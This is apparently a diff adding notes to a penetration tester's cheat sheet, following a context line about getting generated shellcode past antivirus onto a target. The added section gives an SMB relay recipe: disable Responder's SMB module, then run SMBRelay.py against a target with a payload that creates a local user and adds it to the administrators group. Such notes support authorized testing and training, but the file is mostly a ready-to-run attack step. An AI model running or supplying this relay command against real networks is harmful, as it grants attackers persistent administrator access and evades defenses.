@@ -20,3 +20,14 @@ generate -t c -f /tmp/header.c
 
 Then use your AV Bypass tech of choice to get it to run on target.
 
+
+
+SMBRelay.py Notes
+
+To do SMBRelay turn off SMB module in Responder
+
+python SMBRelay.py -i 192.168.1.10 -c 'net user Test password! /add &&net localgroup administrators Test /add' -t <ipaddress of target> -u Administrator otheraccount
+
+and then wait
+
+
